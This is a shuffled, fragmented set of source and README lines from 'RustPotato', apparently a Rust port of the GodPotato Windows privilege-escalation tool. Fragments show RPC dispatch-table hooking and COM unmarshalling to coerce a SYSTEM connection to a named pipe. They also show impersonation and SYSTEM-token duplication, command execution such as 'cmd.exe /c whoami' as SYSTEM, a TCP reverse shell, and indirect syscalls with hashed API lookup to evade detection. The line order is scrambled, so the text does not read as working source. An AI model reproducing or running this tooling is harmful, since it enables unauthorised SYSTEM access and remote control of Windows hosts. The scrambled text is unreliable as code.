"            unsafe { $crate::win32::macros::isyscall($ssn, $addr "
"            unsafe { ntdll().nt_terminate_process.run(nt_current_process(), 1) }"
"            use_protseq_delegate: ptr::null_mut(),"
"            use_protseq_function_param_count: 0xFFFFFF,"
"            use_protseq_function_ptr: ptr::null_mut(),"
"            username,"
"            w_show_window: 0,"
"            wsa_cleanup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            wsa_startup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },"
"            },"
"        ""mov {}, gs:[0x60]"","
"        (winsock().socket)(2, 1, 6) // AF_INET, SOCK_STREAM, IPPROTO_TCP"
"        // Attempt to set the global context, ensuring only one instance exists"
"        // Compare the SIDs safely, ensuring both are present"
"        // Fifth part: 6 bytes, represented as individual bytes in the format"
"        // First part: 4 bytes, stored as a 32-bit integer (little-endian)"
"        // Fourth part: 2 bytes, represented as two separate bytes in the format"
"        // If module name is not ntdll.dll, skip."
"        // If no command is provided, skip execution"
"        // If the buffer size is zero, return early as no data can be retrieved."
"        // If the query fails, return None."
"        // Query the token again, this time with the allocated buffer to retrieve user information."
"        // Retrieve the global context, which contains necessary data for endpoint setup."
"        // Second part: 2 bytes, stored as a 16-bit integer (little-endian)"
"        // Third part: 2 bytes, stored as a 16-bit integer (little-endian)"
"        1,                                  // Max instances: only one instance of the pipe"
"        CREATE_NO_WINDOW, CREATE_UNICODE_ENVIRONMENT, ClientId, GENERIC_EXECUTE, GENERIC_READ,"
"        CREATE_UNICODE_ENVIRONMENT, IoStatusBlock, ProcessBasicInformation, ProcessInformation,"
"        FILE_CREATE,                        // Creation disposition: create new, fail if exists"
"        FILE_CREATE, FILE_GENERIC_WRITE, FILE_NON_DIRECTORY_FILE, FILE_PIPE_BYTE_STREAM_MODE,"
"        FILE_GENERIC_WRITE,"
"        FILE_PIPE_BYTE_STREAM_MODE,         // Read mode: byte stream mode for reading"
"        FILE_PIPE_BYTE_STREAM_TYPE,         // Pipe type: byte stream (no message boundaries)"
"        FILE_PIPE_BYTE_STREAM_TYPE, FILE_PIPE_QUEUE_OPERATION, FILE_SHARE_READ, FILE_SHARE_WRITE,"
"        FILE_PIPE_QUEUE_OPERATION,          // Completion mode: operations are queued"
"        FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE, PAGE_EXECUTE_READWRITE,"
"        FILE_SHARE_READ,"
"        FILE_SYNCHRONOUS_IO_NONALERT,       // Create options: synchronous I/O, no alerts"
"        FILE_SYNCHRONOUS_IO_NONALERT, FILE_WRITE_ATTRIBUTES, GENERIC_READ, IoStatusBlock,"
"        GENERIC_WRITE, IoStatusBlock, NT_SUCCESS, OBJ_CASE_INSENSITIVE, ObjectAttributes,"
"        IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE, ImageDosHeader, ImageExportDirectory,"
"        INIT_NTDLL.store(true, Ordering::Release)"
"        ImageDosHeader, ImageExportDirectory, ImageNtHeaders, ListEntry, LoaderDataTableEntry,"
"        ImageNtHeaders, LoaderDataTableEntry, PebLoaderData, find_peb,"
"        LargeInteger, OBJ_CASE_INSENSITIVE, OBJ_INHERIT, ObjectAttributes, SYNCHRONIZE,"
"        OBJ_CASE_INSENSITIVE, // Case-insensitive name comparison."
"        ObjectInformationClass::ObjectHandleFlagInformation as u32,"
"        PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION, ProcessInformation, STARTF_USESTDHANDLES,"
"        PebLoaderData, find_peb,"
"        STATUS_BUFFER_TOO_SMALL, STATUS_INFO_LENGTH_MISMATCH, SecurityAttributes, StartupInfoW,"
"        SecurityAttributes, StartupInfoW,"
"        SecurityAttributes, UnicodeString, nt_current_teb,"
"        Some(TokenUsername::new(name_string, domain_string))"
"        TokenUsername { name, domain }"
"        _ => 0,"
"        _print!("""
"        _print!(""["
"        a: c_ulong,"
"        attributes, // Case-insensitive and possibly inheritable"
"        b_inherit_handle: true,"
"        completion_mode: u32,"
"        core::mem::size_of::<ObjectHandleAttributeInformation>() as u32,"
"        create_disposition: u32,"
"        create_options: u32,"
"        def::{ClientId, ObjectAttributes, UnicodeString},"
"        desired_access: u32,"
"        effective_level: u8,"
"        for (_, handle) in handles.iter().enumerate() {"
"        for (i, "
"        handle,"
"        handle_attributes: u32,"
"        if let (Some(node_sid), Some(process_sid)) = ("
"        if target_pid.map_or(true, "
"        inbound_quota: u32,"
"        ldr::{ldr_function, ldr_module},"
"        length: u32,"
"        let addr = if addr == ""localhost"" {"
"        let buffer = ProcessToken::get_token_info(token_handle, 1)"
"        let buffer = ProcessToken::get_token_info(token_handle, 18)"
"        let buffer = ProcessToken::get_token_info(token_handle, 8)"
"        let buffer = ProcessToken::get_token_info(token_handle, 9)"
"        let buffer_opt = ProcessToken::get_token_info(token_handle, 11)"
"        let hr = unsafe { CoInitializeEx(None, COINIT_MULTITHREADED) }"
"        let ioctl_result = (winsock().ioctlsocket)(sock, FIONBIO, "
"        let ldr_load_dll_addr = unsafe { ldr_function(ntdll.module_base, 0x9e456a43) }"
"        let mut value = format!(""S-{}"", revision)"
"        let part1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])"
"        let part1 = u32::from_str_radix(parts[0], 16)"
"        let part2 = u16::from_le_bytes([bytes[4], bytes[5]])"
"        let part2 = u16::from_str_radix(parts[1], 16)"
"        let part3 = u16::from_le_bytes([bytes[6], bytes[7]])"
"        let part3 = u16::from_str_radix(parts[2], 16)"
"        let part4 = u16::from_str_radix(parts[3], 16)"
"        let part5 = u64::from_str_radix(parts[4], 16)"
"        let result = (winsock().connect)(sock, sockaddr, core::mem::size_of::<SockAddrIn>() as i32)"
"        let result = (winsock().wsa_startup)(0x0202, "
"        let result = unsafe { ConvertStringSidToSidW(wide_sid.as_ptr(), "
"        let rtl_allocate_heap_addr = unsafe { ldr_function(ntdll.module_base, 0x3be94c5a) }"
"        let status = (winsock().getaddrinfo)(hostname_cstr.as_ptr(), null(), "
"        list_process_tokens(None, "
"        lp_security_descriptor: null_mut(),"
"        maximum_instances: u32,"
"        n_length: core::mem::size_of::<SecurityAttributes>() as u32,"
"        n_size,                             // Inbound quota: input buffer size"
"        n_size,                             // Outbound quota: output buffer size"
"        named_pipe_type: u32,"
"        new_protect: u32,"
"        ntdll.module_base = unsafe { ldr_module(0x1edab0ed, None) }"
"        null_mut(),           // No name for the object."
"        null_mut(),           // No root directory."
"        null_mut(),           // No security descriptor."
"        null_mut(),"
"        object_information_class: u32,"
"        object_information_length: u32,"
"        open_options: u32,"
"        options: u32,"
"        outbound_quota: u32,"
"        pipe_id,"
"        println!(""["
"        println!(""{:<30} {:<10} {:<20}"", ""Function"", ""SSN"", ""Address"")"
"        process_information_class: u32,"
"        process_information_length: u32,"
"        read_mode: u32,"
"        run(input_arg, None, None)"
"        run_syscall!(self.number, self.address as usize, handle)"
"        security_descriptor,"
"        share_access: u32,"
"        system_information_class: u32,"
"        system_information_length: u32,"
"        target_process_pid: u32,"
"        token_information_class: u32,"
"        token_information_length: u32,"
"        token_type: u32,"
"        unsafe { nt_current_teb().as_ref().unwrap().client_id.unique_process } as usize,"
"        write!(f, ""{}"
"        writeln!(f, ""   Is Restricted: {}"", self.is_restricted)"
"        writeln!(f, ""   Target Process PID: {}"", self.target_process_pid)"
"        writeln!(f, ""   Token Handle: 0x{:X}"", self.token_handle as usize)"
"        writeln!(f, ""["
"    """
"    ""Win32_Foundation"", "
"    ""Win32_System_Com"", "
"    ""Win32_System_Com_Marshal"", "
"    ""Win32_System_Com_StructuredStorage"""
"    ""errhandlingapi"","
"    ""fileapi"","
"    ""memoryapi"","
"    ""minwinbase"","
"    ""namedpipeapi"","
"    ""sddl"","
"    ""securitybaseapi"","
"    ""winbase"","
"    ""winerror"","
"    ""winnt"", "
"    ($module_base:expr, $( $syscall:expr ),"
"    ($module_base:expr, [ $( ($syscall:expr, $hash:expr, $f:ty) ),"
"    ($name:ident, $hash:expr) => {"
"    ($ssn:expr, $addr:expr, $($y:expr), "
"    // Initialize object attributes for the process, setting up the basic structure with default"
"    // ffi::c_void,"
"    ///   of memory to be changed, in bytes."
"    /// - Extracts key pointers such as the dispatch table, format string offsets, and process string."
"    /// - If a connection is established, impersonates the client to retrieve a system token."
"    /// - If the hook is not active or the original function pointer is null, logs a failure message."
"    /// - If the hook is successfully restored, logs the restoration and deactivates the hook state."
"    /// - If the pipe is inaccessible, attempts to interrupt the server thread."
"    /// - If the system token is unavailable, logs an error and skips execution."
"    /// - If validation fails or an unsupported parameter count is encountered, the function logs an error and exits without further modifications."
"    /// Duplicates a token, converting it to a primary token if necessary."
"    /// Ensures the token has a valid impersonation level, upgrading it if necessary."
"    /// Finally, it calls "
"    /// Formats the username in the ""DOMAIN"
"    /// If so, it restores the original function pointer in the dispatch table and marks the hook as inactive."
"    /// Indicates the trust level of the token (e.g., low, medium, high)."
"    /// It creates a named pipe with specific security attributes, waits for a client connection,"
"    /// Primary tokens are used for process creation, while impersonation tokens are used to assume another identity."
"    /// Shared reference to the system identity, typically used for impersonation."
"    /// The security token associated with this identity, wrapped in a "
"    /// The token elevation type indicates whether the token is a full elevated token,"
"    /// This function allocates memory for binding strings, initializes the structure,"
"    /// This function duplicates an object handle, allowing the handle to be shared across processes"
"    /// This function initializes the COM library, creates a standard COM object implementing "
"    /// This function queries a token's information to determine its type,"
"    /// This function queries the token to determine its impersonation level, which"
"    /// This function retrieves the moniker's display name, decodes it from Base64, constructs"
"    /// This method extracts token attributes, including SID, token type, impersonation level,"
"    /// a bind context, and a moniker to interact with the object. The resulting trigger object encapsulates"
"    /// a limited token, or a default token, providing insights into the token's privilege level."
"    /// associated SID, which identifies the security context of the token."
"    /// for readability. Handles optional fields gracefully, displaying ""None"" if they are unset."
"    /// integrity level, and elevation type. It uses various helper methods to gather this data."
"    /// it returns the token handle directly. Otherwise, it duplicates the token and returns"
"    /// its integrity level. The integrity level defines the trust level of the token,"
"    /// level is not already set, it attempts to duplicate the token with higher impersonation"
"    /// such as Low, Medium, or High integrity."
"    Anonymous = 0,"
"    COINIT_MULTITHREADED, CoInitializeEx, CreateBindCtx, CreateObjrefMoniker, IBindCtx, IMoniker,"
"    ConvertStringSecurityDescriptorToSecurityDescriptorW, ConvertStringSidToSidW,"
"    Custom = 0x4,"
"    Default = 1,"
"    Delegation = 3,"
"    DllName: UnicodeString,"
"    EpmProtocolAppletalk = 0x18,"
"    EpmProtocolDdp = 0x17,"
"    EpmProtocolDnetNsp = 0x04,"
"    EpmProtocolDsp = 0x16,"
"    EpmProtocolHttp = 0x1f,"
"    EpmProtocolIp = 0x09,"
"    EpmProtocolIpx = 0x0e,"
"    EpmProtocolNamedPipe = 0x10,"
"    EpmProtocolNbIpx = 0x14,"
"    EpmProtocolNcacn = 0x0b,"
"    EpmProtocolNcadg = 0x0a,"
"    EpmProtocolNcalrpc = 0x0c,"
"    EpmProtocolNetbeui = 0x12,"
"    EpmProtocolNetbios = 0x11,"
"    EpmProtocolNull = 0x21,"
"    EpmProtocolOsiClns = 0x06,"
"    EpmProtocolOsiTp4 = 0x05,"
"    EpmProtocolSmb = 0x0f,"
"    EpmProtocolSpx = 0x13,"
"    EpmProtocolStreettalk = 0x1c,"
"    EpmProtocolTcp = 0x07,"
"    EpmProtocolUdp = 0x08,"
"    EpmProtocolUnixDs = 0x20,"
"    EpmProtocolUuid = 0x0d,"
"    EpmProtocolVinesIpc = 0x1b,"
"    EpmProtocolVinesSpp = 0x1a,"
"    F: FnMut(ProcessToken) -> bool,"
"    Full = 2,"
"    Handler = 0x2,"
"    HighIntegrity = 0x00003000,"
"    Identification = 1,"
"    Impersonation = 2,"
"    IntegrityLevel, SecurityImpersonationLevel, create_process_with_token_w_piped,"
"    Limited = 3,"
"    LowIntegrity = 0x00001000,"
"    MediumIntegrity = 0x00002000,"
"    ObjectHandleFlagInformation = 4,"
"    Primary = 1,"
"    ProtectedProcess = 0x00005000,"
"    RustPotato.exe ""cmd.exe /c whoami"""
"    Some(process_handle) // Return the obtained process handle, or "
"    Standard = 0x1,"
"    SystemIntegrity = 0x00004000,"
"    Untrusted = 0,"
"    _print!(""["
"    _print, run,"
"    advapi32::advapi32,"
"    alloc::{Layout, alloc_zeroed},"
"    creator_back_trace_index: u16,"
"    define_nt_syscall, resolve_native_functions, run_syscall,"
"    dwCreationFlags: u32,"
"    dwLogonFlags: u32,"
"    ffi::CString,"
"    ffi::c_uint,"
"    ffi::c_void,"
"    fileapi::CreateFileW,"
"    flags: u32,"
"    fmt_string_offset_table: Vec<u16>,"
"    fn try_from(value: u16) -> Result<Self, Self::Error> {"
"    granted_access: u32,"
"    handle_attributes: u32,"
"    handle_value: usize,"
"    if args[1].starts_with(""-"") {"
"    if unsafe { nt_set_handle_information(child_stdout_read, HANDLE_FLAG_INHERIT, 0).ok() }"
"    k32::k32,"
"    label: SidAndAttributes,"
"    lea rdi,  [rsp "
"    lea rsi,  [rsp "
"    let connect_result = connect_socket(sock, h, p)"
"    let device_part = """
"    let functions = core::slice::from_raw_parts(array_of_addresses, number_of_functions as _)"
"    let names = core::slice::from_raw_parts(array_of_names, number_of_functions as _)"
"    let ordinals = core::slice::from_raw_parts(array_of_ordinals, number_of_functions as _)"
"    list_process_tokens,"
"    mask: u32,"
"    mem::zeroed,"
"    minwinbase::SECURITY_ATTRIBUTES,"
"    mov [rsp - 0x10], rdi"
"    mov [rsp - 0x18], r12"
"    mov [rsp - 0x8],  rsi"
"    mov eax, ecx"
"    mov r10, r9"
"    mov r10, rax"
"    mov r12, [rsp - 0x18]"
"    mov r12, rdx"
"    mov r8,   [rsp "
"    mov r9,   [rsp "
"    mov rax, rcx"
"    mov rcx, r12"
"    mov rcx, r8"
"    mov rdi, [rsp - 0x10]"
"    mov rdx,  [rsp "
"    mov rsi, [rsp - 0x8]"
"    nBufferSize: u32,"
"    n_size: u32,"
"    namedpipeapi::ImpersonateNamedPipeClient,"
"    namedpipeapi::{ConnectNamedPipe, CreateNamedPipeW},"
"    nfds: i32,"
"    ntdll::ntdll,"
"    ntdll::{nt_current_process, nt_get_last_error, ntdll},"
"    number_of_handles: usize,"
"    object_type_index: u16,"
"    orcb_rpc_guid: GUID,"
"    pipe_id: u32,"
"    ptr,"
"    ptr::null_mut,"
"    ptr::{null, null_mut},"
"    pub address_of_entry_point: u32,"
"    pub address_of_functions: u32,"
"    pub address_of_name_ordinals: u32,"
"    pub address_of_names: u32,"
"    pub affinity_mask: usize,"
"    pub ai_addrlen: u32,"
"    pub ai_family: i32,"
"    pub ai_flags: i32,"
"    pub ai_protocol: i32,"
"    pub ai_socktype: i32,"
"    pub attributes: c_ulong,"
"    pub attributes: u32,"
"    pub authn_svc: u16,"
"    pub authz_svc: u16,"
"    pub b_inherit_handle: bool,"
"    pub base: u32,"
"    pub base_dll_name: UnicodeString,"
"    pub base_of_code: u32,"
"    pub base_priority: i32,"
"    pub begin_address: u32,"
"    pub being_debugged: bool,"
"    pub bind_ctx: IBindCtx,"
"    pub buffer_length: u32,"
"    pub cb: u32,"
"    pub cb_reserved2: u16,"
"    pub characteristics: u16,"
"    pub characteristics: u32,"
"    pub check_sum: c_ulong,"
"    pub check_sum: u32,"
"    pub client_id: ClientId,"
"    pub client_pipe: String,"
"    pub closesocket: CloseSocketFunc,"
"    pub command_line: UnicodeString,"
"    pub connect: ConnectFunc,"
"    pub console_flags: u32,"
"    pub context_tracking_mode: u8,"
"    pub count_chars_x: u32,"
"    pub count_chars_y: u32,"
"    pub count_of_owned_critical_sections: u32,"
"    pub count_x: u32,"
"    pub count_y: u32,"
"    pub create_process_with_token_w: CreateProcessWithTokenW,"
"    pub critical_section_timeout: i64,"
"    pub current_directory_path: UnicodeString,"
"    pub current_locale: u32,"
"    pub data_representation: u32,"
"    pub debug_flags: u32,"
"    pub desktop_info: UnicodeString,"
"    pub dispatch_table: RpcDispatchFunction,"
"    pub dispatch_table_count: u32,"
"    pub dll_characteristics: u16,"
"    pub dll_path: UnicodeString,"
"    pub domain: String,"
"    pub dual_string_array: DualStringArray,"
"    pub dw_fill_attribute: u32,"
"    pub dw_flags: u32,"
"    pub dw_process_id: u32,"
"    pub dw_thread_id: u32,"
"    pub dw_x: u32,"
"    pub dw_x_count_chars: u32,"
"    pub dw_x_size: u32,"
"    pub dw_y: u32,"
"    pub dw_y_count_chars: u32,"
"    pub dw_y_size: u32,"
"    pub e_cblp: u16,"
"    pub e_cp: u16,"
"    pub e_cparhdr: u16,"
"    pub e_crlc: u16,"
"    pub e_cs: u16,"
"    pub e_csum: u16,"
"    pub e_ip: u16,"
"    pub e_lfanew: i32,"
"    pub e_lfarlc: u16,"
"    pub e_magic: u16,"
"    pub e_maxalloc: u16,"
"    pub e_minalloc: u16,"
"    pub e_oemid: u16,"
"    pub e_oeminfo: u16,"
"    pub e_ovno: u16,"
"    pub e_sp: u16,"
"    pub e_ss: u16,"
"    pub effective_only: u8,"
"    pub end_address: u32,"
"    pub environment_size: u32,"
"    pub environment_update_count: c_ulong,"
"    pub environment_version: u32,"
"    pub exception_code: u32,"
"    pub exit_status: i32,"
"    pub extern ""system"" fn fun10("
"    pub extern ""system"" fn fun11("
"    pub extern ""system"" fn fun12("
"    pub extern ""system"" fn fun13("
"    pub extern ""system"" fn fun14("
"    pub extern ""system"" fn fun4("
"    pub extern ""system"" fn fun5("
"    pub extern ""system"" fn fun6("
"    pub extern ""system"" fn fun7("
"    pub extern ""system"" fn fun8("
"    pub extern ""system"" fn fun9("
"    pub fd_count: u32,"
"    pub file_alignment: u32,"
"    pub file_header: ImageFileHeader,"
"    pub fill_attribute: u32,"
"    pub flags: c_ulong,"
"    pub flags: u32,"
"    pub fn isyscall(ssn: u16, addr: usize, n_args: u32, ...) -> i32"
"    pub fn new(authn_svc: u16, authz_svc: u16, principal_name: Option<String>) -> Self {"
"    pub fn new(guid: GUID, standard_objref: Standard) -> Self {"
"    pub fn new(name: String, domain: String) -> TokenUsername {"
"    pub forwarder_links: ListEntry,"
"    pub fp_software_status_register: u32,"
"    pub freeaddrinfo: FreeAddrInfoFunc,"
"    pub full_dll_name: UnicodeString,"
"    pub gdi_batch_count: u32,"
"    pub gdi_last_spare_tcell: u32,"
"    pub gdi_last_spare_tx: u32,"
"    pub gdi_prev_spare_tcell: u32,"
"    pub gdi_prev_spare_tx: u32,"
"    pub getaddrinfo: GetAddrInfoFunc,"
"    pub group_count: u32,"
"    pub guid: GUID,"
"    pub hash_links: ListEntry,"
"    pub hash_links_or_section_pointer: HashLinksOrSectionPointer,"
"    pub heap_de_commit_free_block_threshold: c_ulong,"
"    pub heap_de_commit_total_free_threshold: c_ulong,"
"    pub heap_segment_commit: c_ulong,"
"    pub heap_segment_reserve: c_ulong,"
"    pub high_part: i32,"
"    pub htons: HtonsFunc,"
"    pub i_max_sockets: u16,"
"    pub i_max_udp_dg: u16,"
"    pub image_base: u64,"
"    pub image_path_name: UnicodeString,"
"    pub image_sub_system: c_ulong,"
"    pub image_sub_system_major_version: c_ulong,"
"    pub image_sub_system_minor_version: c_ulong,"
"    pub impersonation_level: Option<SecurityImpersonationLevel>,"
"    pub impersonation_level: u32,"
"    pub in_initialization_order_links: ListEntry,"
"    pub in_initialization_order_module_list: ListEntry,"
"    pub in_load_order_links: ListEntry,"
"    pub in_load_order_module_list: ListEntry,"
"    pub in_memory_order_links: ListEntry,"
"    pub in_memory_order_module_list: ListEntry,"
"    pub inet_addr: InetAddrFunc,"
"    pub information: c_ulong,"
"    pub inherit: bool,"
"    pub inherited_address_space: bool,"
"    pub initialized: c_ulong,"
"    pub integrity_level: Option<IntegrityLevel>,"
"    pub interface_id: RpcSyntaxIdentifier,"
"    pub ioctlsocket: IoctlsocketFunc,"
"    pub ipid: GUID,"
"    pub is_hook: bool,"
"    pub is_restricted: bool,"
"    pub is_start: bool,"
"    pub last_error_value: u32,"
"    pub ldr_load_dll: LdrLoadDll,"
"    pub length: c_ulong,"
"    pub length: u16,"
"    pub length: u32,"
"    pub load_count: i16,"
"    pub loader_flags: u32,"
"    pub loader_threads: u32,"
"    pub low_part: u32,"
"    pub machine: u16,"
"    pub magic: u16,"
"    pub major_image_version: u16,"
"    pub major_linker_version: u8,"
"    pub major_operating_system_version: u16,"
"    pub major_subsystem_version: u16,"
"    pub major_version: u16,"
"    pub maximum_length: u16,"
"    pub maximum_length: u32,"
"    pub maximum_number_of_heaps: c_ulong,"
"    pub minor_image_version: u16,"
"    pub minor_linker_version: u8,"
"    pub minor_operating_system_version: u16,"
"    pub minor_subsystem_version: u16,"
"    pub minor_version: u16,"
"    pub moniker: IMoniker,"
"    pub n_count: usize,"
"    pub n_length: u32,"
"    pub name: String,"
"    pub name: u32,"
"    pub network_address: String,"
"    pub nt_close: NtClose,"
"    pub nt_create_named_pipe_file: NtCreateNamedPipeFile,"
"    pub nt_duplicate_object: NtDuplicateObject,"
"    pub nt_duplicate_token: NtDuplicateToken,"
"    pub nt_global_flag: c_ulong,"
"    pub nt_open_file: NtOpenFile,"
"    pub nt_open_process: NtOpenProcess,"
"    pub nt_open_process_token: NtOpenProcessToken,"
"    pub nt_protect_virtual_memory: NtProtectVirtualMemory,"
"    pub nt_query_information_process: NtQueryInformationProcess,"
"    pub nt_query_information_token: NtQueryInformationToken,"
"    pub nt_query_object: NtQueryObject,"
"    pub nt_query_system_information: NtQuerySystemInformation,"
"    pub nt_read_file: NtReadFile,"
"    pub nt_set_information_object: NtSetInformationObject,"
"    pub nt_terminate_process: NtTerminateProcess,"
"    pub nt_tib: NtTib,"
"    pub nt_wait_for_single_object: NtWaitForSingleObject,"
"    pub nt_write_file: NtWriteFile,"
"    pub num_entries: u16,"
"    pub number_of_functions: u32,"
"    pub number_of_heaps: c_ulong,"
"    pub number_of_names: u32,"
"    pub number_of_processors: c_ulong,"
"    pub number_of_rva_and_sizes: u32,"
"    pub number_of_sections: u16,"
"    pub number_of_symbols: u32,"
"    pub oid: u64,"
"    pub optional_header: ImageOptionalHeader64,"
"    pub os_build_number: c_ulong,"
"    pub os_major_version: c_ulong,"
"    pub os_minor_version: c_ulong,"
"    pub os_platform_id: c_ulong,"
"    pub oxid: u64,"
"    pub p_iunknown: IUnknown,"
"    pub peek_named_pipe: PeekNamedPipe,"
"    pub pipe_server_thread: Arc<Mutex<Option<JoinHandle<()>>>>,"
"    pub pointer_to_symbol_table: u32,"
"    pub post_process_init_routine: c_ulong,"
"    pub principal_name: Option<String>,"
"    pub proc_num: u32,"
"    pub process_group_id: u32,"
"    pub protect_from_close: bool,"
"    pub public_refs: u32,"
"    pub read_image_file_exec_options: bool,"
"    pub recv: RecvFunc,"
"    pub reserved: isize,"
"    pub rpc_flags: u32,"
"    pub rpc_protseq_endpoint_count: u32,"
"    pub rtl_allocate_heap: Option<RtlAllocateHeap>,"
"    pub runtime_data: UnicodeString,"
"    pub s_addr: u32,"
"    pub sa_family: u16,"
"    pub section_alignment: u32,"
"    pub section_pointer: SectionPointer,"
"    pub security_binding: SecurityBinding,"
"    pub security_offset: u16,"
"    pub select: SelectFunc,"
"    pub send: SendFunc,"
"    pub server_pipe: String,"
"    pub service_tag_links: ListEntry,"
"    pub session_id: c_ulong,"
"    pub shell_info: UnicodeString,"
"    pub show_window_flags: u32,"
"    pub sid: Option<Sid>,"
"    pub signature: u32,"
"    pub sin_addr: InAddr,"
"    pub sin_family: u16,"
"    pub sin_port: u16,"
"    pub size: u32,"
"    pub size_of_code: u32,"
"    pub size_of_headers: u32,"
"    pub size_of_heap_commit: u64,"
"    pub size_of_heap_reserve: u64,"
"    pub size_of_image: c_ulong,"
"    pub size_of_image: u32,"
"    pub size_of_initialized_data: u32,"
"    pub size_of_optional_header: u16,"
"    pub size_of_stack_commit: u64,"
"    pub size_of_stack_reserve: u64,"
"    pub size_of_uninitialized_data: u32,"
"    pub socket: SocketFunc,"
"    pub spare: bool,"
"    pub standard_objref: Standard,"
"    pub starting_x: u32,"
"    pub starting_y: u32,"
"    pub static_links: ListEntry,"
"    pub status: i32,"
"    pub string_binding: StringBinding,"
"    pub subsystem: u16,"
"    pub syntax_guid: windows_core::GUID,"
"    pub syntax_version: RpcVersion,"
"    pub system_identity: Option<Arc<Mutex<WindowsIdentity>>>,"
"    pub target_process_pid: u32,"
"    pub time_date_stamp: c_ulong,"
"    pub time_date_stamp: u32,"
"    pub time_date_stamp_or_loaded_imports: TimeDateStampOrLoadedImports,"
"    pub tls_expansion_bitmap: c_ulong,"
"    pub tls_expansion_counter: c_ulong,"
"    pub tls_index: i16,"
"    pub token: Option<RawHandle>,"
"    pub token_elevation_type: Option<TokenElevationType>,"
"    pub token_type: Option<TokenType>,"
"    pub tower_id: TowerProtocol,"
"    pub transfer_syntax: RpcSyntaxIdentifier,"
"    pub tv_sec: i32,"
"    pub tv_usec: i32,"
"    pub tx_fb_context: u32,"
"    pub tx_fs_context: u32,"
"    pub u: IMAGE_RUNTIME_FUNCTION_ENTRY_u,"
"    pub u: IO_STATUS_BLOCK_u,"
"    pub unmashal_trigger: Option<RustPotatoUnmarshalTrigger>,"
"    pub unwind_data: u32,"
"    pub unwind_info_address: u32,"
"    pub use_protseq_function_param_count: u32,"
"    pub user: SidAndAttributes,"
"    pub username: Option<TokenUsername>,"
"    pub value: String,"
"    pub virtual_address: u32,"
"    pub w_high_version: u16,"
"    pub w_show_window: u16,"
"    pub w_version: u16,"
"    pub win32_version_value: u32,"
"    pub window_flags: u32,"
"    pub window_title: UnicodeString,"
"    pub wsa_cleanup: WSACleanupFunc,"
"    pub wsa_get_last_error: WSAGetLastErrorFunc,"
"    pub wsa_startup: WSAStartupFunc,"
"    reserved: u32,"
"    reserved: usize,"
"    resolve_functions,"
"    securitybaseapi::RevertToSelf,"
"    sub rcx, 0x4"
"    sync::atomic::{AtomicBool, Ordering},"
"    unique_process_id: usize,"
"    unsafe extern ""system"" fn(hHeap: "
"    unsafe extern ""system"" fn(wVersionRequested: u16, lpWsaData: "
"    utils::nt_create_named_pipe_file,"
"    utils::{dbj2_hash, get_cstr_len},"
"    win32::ntdll::{nt_current_process, ntdll},"
"    win32::utils::{dbj2_hash, get_cstr_len},"
"    win32::{def::UnicodeString, ntdll::ntdll},"
"    winbase::LocalFree,"
"    winsock::{FD_SET, FIONBIO, TIMEVAL, connect_socket, create_socket, init_winsock, winsock},"
"    xor r10, r10"
"    },"
"  A named pipe (e.g., "
"  During impersonation, RustPotato locates and duplicates a token associated with the "
"  RustPotato crafts and unmarshals a COM object, compelling "
"  RustPotato features a TCP-based reverse shell based on [Rustic64Shell](https://github.com/safedv/Rustic64Shell). It leverages Winsock APIs for network communication and indirect NT APIs for pipe-based I/O redirection, enabling command execution through "
"  RustPotato leverages indirect NTAPI calls for various operations, including token handling and manipulation."
"  RustPotato uses the duplicated token to execute a specified command, leveraging "
"  Stops the named pipe server, releasing all associated resources and handles."
"  The unmarshalled object invokes RPC calls that traverse the hooked dispatch table, allowing RustPotato to intercept and manipulate the interactions."
" ""base64"","
" ""byteorder"","
" ""cmd"".to_string()), // Default to ""cmd"" if -c is not provided"
" ""libc"","
" ""libc-print"","
" ""proc-macro2"","
" ""quote"","
" ""syn"","
" ""unicode-ident"","
" ""winapi"","
" ""winapi-i686-pc-windows-gnu"","
" ""winapi-x86_64-pc-windows-gnu"","
" ""windows"","
" ""windows-core"","
" ""windows-implement"","
" ""windows-interface"","
" ""windows-result"","
" ""windows-strings"","
" ""windows-targets"","
" ""windows_aarch64_gnullvm"","
" ""windows_aarch64_msvc"","
" ""windows_i686_gnu"","
" ""windows_i686_gnullvm"","
" ""windows_i686_msvc"","
" ""windows_x86_64_gnu"","
" ""windows_x86_64_gnullvm"","
" ""windows_x86_64_msvc"","
" (digit - 10),"
" - The NTSTATUS code of the operation, indicating success or failure of the system call."
" - The NTSTATUS code of the operation, indicating success or failure."
" // ""MZ"""
" // ""PE"
" 0x100, // MediumIntegrity "
" 0x12, cnt, $($y), "
" 0x200],"
" 0x3d],"
" 10],"
" 129],"
" 14],"
" 16], Box<dyn core::error::Error>> {"
" 16],"
" 1],"
" 22],"
" 24],"
" 257],"
" 26],"
" 2],"
" 32],"
" 40],"
" 4],"
" 54],"
" 5],"
" 64],"
" 80],"
" 8],"
" A pointer to a variable that receives the size of the data returned, if applicable."
" A pointer to a variable that receives the size, in bytes,"
" CREATE_NO_WINDOW,"
" FILE_NON_DIRECTORY_FILE,"
" FILE_SHARE_WRITE, // Share mode: allows read/write by other processes"
" FILE_SHARE_WRITE,"
" GENERIC_WRITE,"
" PROCESS_QUERY_INFORMATION,"
" SYNCHRONIZE, // Desired access: read, write attributes, sync"
" String::from(""None""))"
" The attributes for the duplicated handle (e.g., inheritable)."
" The length, in bytes, of the buffer pointed to by the "
" The size of the input buffer, in bytes."
" The size of the output buffer, in bytes."
" The size, in bytes, of the buffer pointed to by "
" The size, in bytes, of the buffer pointed to by the"
" TokenUsername::new(String::from("""
" are provided, a reverse shell is started."
" connects to the named pipe, RustPotato impersonates the client using "
" containing the UTF-16 encoded string, null-terminated."
" digit,"
" for port) are provided, it initiates a reverse shell using the system token."
" format!(""{:"
" however, in this wrapper, the result is simplified to a boolean."
" if no match is found. In this case, the "
" if the operation fails at any step (e.g., socket creation, connection, or process execution)."
" if the operation was successful, "
" if unmarshalling succeeds, containing a pointer to the unmarshalled interface."
" instance, ensuring it is initialized before use."
" is a Rust-based implementation of [GodPotato](https://github.com/BeichenDream/GodPotato), a privilege escalation tool that abuses "
" is provided, it is populated with the module's size."
" is provided, the specified command is executed with SYSTEM privileges."
" is used to obtain the handle, and the"
" module and essential components, such as the dispatch table and procedure string."
" object with updated details, and serializes it into a byte stream."
" on success, indicating the bindings were created successfully."
" or a success, return None."
